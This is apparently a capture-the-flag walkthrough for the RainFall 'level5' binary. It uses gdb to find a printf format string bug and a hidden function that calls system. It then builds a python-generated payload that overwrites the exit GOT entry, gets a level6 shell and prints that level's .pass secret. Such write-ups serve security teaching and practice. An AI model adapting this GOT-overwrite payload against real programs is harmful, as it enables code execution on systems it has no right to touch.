# We have a executable "level5" lets do some test!

>level5@RainFall:~$ ./level5
test
test
>level5@RainFall:~$ ./level5
test test
test test
>level5@RainFall:~$

# Like the previous two level the program print stdin, next step use gdb!

>level5@RainFall:~$ gdb level5
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp
   0x08048507 <+3>:	and    $0xfffffff0,%esp
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    
End of assembler dump.

# The main do nothging except call function n

(gdb) disas n
[...]
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
[...]

# n call fgets and printf with the same weakness as before but there is no system call this time.

# But maybe there are other function? Let's check

(gdb) info function
[...]
0x08048480  frame_dummy
0x080484a4  o
0x080484c2  n
0x08048504  main
[...]

# We have a suspucious function o!

(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x18,%esp
   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	movl   $0x1,(%esp)
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.

# Bingo, the function o make a system call. Now we must found a way to call the function o with the printf exploit

(gdb) r
Starting program: /home/user/level5/level5 
AAAA%x.%x.%x.%x.%x.
AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825.
[Inferior 1 (process 3189) exited with code 01]

# We can write in the fourth address. But what will we write in it?

# Maybe we can change the value of the exit address to the o function? Let's learn more about exit

(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0x08048390  _exit
0x08048390  _exit@plt
0x080483d0  exit
0x080483d0  exit@plt
(gdb) x/i 0x080483d0
   0x80483d0 <exit@plt>:	jmp    *0x8049838


# Let's try with 0x8049838 address, and we must match it with the 0x080484a4 value (134513828 in decimal)

(gdb)r <<< $(python -c "print('\x38\x98\x04\x08'  + '%x.%x.%134513828x.%n')")
[...]
[...]
[...]
Breakpoint 1, 0x080484f8 in n ()
(gdb) x/wx 0x8049838
0x8049838 <exit@got.plt>:	0x080484b6

# We are to high by 18
(gdb)r <<< $(python -c "print('\x38\x98\x04\x08'  + '%x.%x.%134513810x.%n')")
[...]
[...]
[...]
Breakpoint 1, 0x080484f8 in n ()
(gdb) x/wx 0x8049838
0x8049838 <exit@got.plt>:	0x080484a4

# Seem's good let's try it outside gdb

>level5@RainFall:~$ python -c "print('\x38\x98\x04\x08'  + '%x.%x.%134513810x.%n')" > /tmp/test
>level5@RainFall:~$ cat /tmp/test -| ./level5
[...]
[...]
[...]
ls
ls: cannot open directory .: Permission denied
whoami
level6
cd ..
cd level6
cat .pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

